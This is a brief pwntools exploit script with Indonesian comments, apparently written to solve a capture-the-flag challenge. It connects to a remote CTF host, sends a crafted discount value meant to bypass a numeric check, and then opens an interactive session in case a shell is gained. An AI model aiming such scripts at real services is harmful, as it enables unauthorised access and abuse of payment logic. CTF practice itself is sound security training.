from pwn import *

# Pengaturan target
# r = process('./vulnerable_program') # Untuk lokal
r = remote('target-ctf.com', 1337)     # Untuk nc (remote)

# Gunakan hasil dari calcuint.py kamu di sini
diskon_bypass = 190 

# Mengirim input
r.sendlineafter(b"Masukkan diskon: ", str(diskon_bypass).encode())

# Interaksi manual jika shell sudah terbuka
r.interactive()